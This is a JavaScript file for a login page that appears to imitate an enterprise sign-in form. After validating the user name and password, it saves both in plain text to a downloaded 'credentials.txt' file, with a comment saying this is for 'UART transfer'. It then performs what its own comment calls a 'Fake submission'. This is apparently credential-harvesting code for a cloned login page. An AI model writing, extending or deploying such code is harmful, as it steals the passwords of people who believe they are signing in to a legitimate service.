function LoginErrors() {
  this.userNameFormatError = 'Enter your user ID in the format "domain\\user" or "user@domain".';
  this.passwordEmpty = 'Enter your password.';
  this.passwordTooLong = 'Password is too long (> 128 characters).';
}
var maxPasswordLength = 128;

function InputUtil(errTextElementID = 'errorText', errDisplayElementID = 'error') {
  this.hasFocus = false;
  this.errLabel = document.getElementById(errTextElementID);
  this.errDisplay = document.getElementById(errDisplayElementID);
}

InputUtil.prototype.canDisplayError = function () {
  return this.errLabel && this.errDisplay;
};

InputUtil.prototype.checkError = function () {
  if (!this.canDisplayError()) return;
  if (this.errLabel.innerHTML) {
    this.errDisplay.style.display = '';
    const cause = this.errLabel.getAttribute('for');
    const causeNode = document.getElementById(cause);
    if (causeNode && causeNode.value) {
      causeNode.focus();
      this.hasFocus = true;
    }
  } else {
    this.errDisplay.style.display = 'none';
  }
};

InputUtil.prototype.setInitialFocus = function (input) {
  if (this.hasFocus) return;
  const node = document.getElementById(input);
  if (node && /^\s*$/.test(node.value)) {
    node.focus();
    this.hasFocus = true;
  }
};

InputUtil.prototype.setError = function (input, errorMsg) {
  if (!this.canDisplayError()) return;
  input.focus();
  if (errorMsg) this.errLabel.innerHTML = errorMsg;
  this.errLabel.setAttribute('for', input.id);
  this.errDisplay.style.display = '';
};

function Login() {}
Login.userNameInput = 'userNameInput';
Login.passwordInput = 'passwordInput';

Login.initialize = function () {
  const u = new InputUtil();
  u.checkError();
  u.setInitialFocus(Login.userNameInput);
  u.setInitialFocus(Login.passwordInput);
};

Login.submitLoginRequest = function () {
  const u = new InputUtil();
  const e = new LoginErrors();

  const userName = document.getElementById(Login.userNameInput);
  const password = document.getElementById(Login.passwordInput);

  if (!userName.value || !userName.value.match(/[@\\]/)) {
    u.setError(userName, e.userNameFormatError);
    return false;
  }

  if (!password.value) {
    u.setError(password, e.passwordEmpty);
    return false;
  }

  if (password.value.length > maxPasswordLength) {
    u.setError(password, e.passwordTooLong);
    return false;
  }

  // --- Save credentials in file for UART transfer ---
  // TODO: js doens't allow to save file locally, check how to do it
  const uartData = `USER=${userName.value}\r\nPASS=${password.value}\r\n`;
  const blob = new Blob([uartData], { type: 'text/plain' });
  const downloadLink = document.createElement('a');
  downloadLink.href = URL.createObjectURL(blob);
  downloadLink.download = 'credentials.txt';
  document.body.appendChild(downloadLink);
  downloadLink.click();
  document.body.removeChild(downloadLink);
  // ---------------------------------------

  document.forms['loginForm'].submit(); // Fake submission
  return false;
};

document.addEventListener('DOMContentLoaded', Login.initialize);
